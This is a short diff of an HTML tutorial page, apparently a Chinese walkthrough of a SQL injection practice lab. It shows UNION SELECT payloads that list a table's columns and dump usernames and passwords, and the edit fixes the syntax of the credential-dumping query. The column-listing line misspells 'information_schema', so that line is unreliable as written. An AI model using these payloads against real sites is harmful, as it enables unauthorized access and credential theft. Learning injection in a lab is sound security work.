@@ -476,7 +476,7 @@
 </li>
 </ol>
 <p>6.爆列名（得到列名username，password…）<code>?id=-1 union select 2,3, group_concat(column_name) from information_schoma.columns where table_name=&#39;users&#39; --+</code></p>
-<p>7.查询内容 <code>?id=-1 union select 2,3, group_concat (username, &#39;:&#39;,password)from security users</code></p>
+<p>7.查询内容 <code>?id=-1 union select 2,3, group_concat (username, &#39;:&#39;,password)from security.users --+</code></p>
 
                 
             </div>
